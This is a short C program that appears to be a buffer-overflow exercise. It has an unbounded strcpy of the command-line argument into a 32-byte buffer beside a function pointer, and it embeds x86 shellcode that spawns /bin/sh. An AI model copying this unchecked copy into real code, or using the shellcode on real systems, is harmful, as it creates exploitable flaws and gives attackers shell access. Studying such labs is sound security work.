#include <stdio.h>
#include <string.h>
#include <stdlib.h>

static const char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68"
				"\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89"
				"\xe1\x31\xd2\xb0\x0b\xcd\x80";

static void do_nothing_successfully(void)
{
	puts("Do nothing, successfully!");
}

int main(int argc, char **argv)
{
	void (*func_ptr)(void) = do_nothing_successfully;
	char buffer[32];

	if (argc != 2) {
		fprintf(stderr, "Usage: %s string\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	strcpy(buffer, argv[1]);

	/* Call shellcode. */
	func_ptr();

	return 0;
}
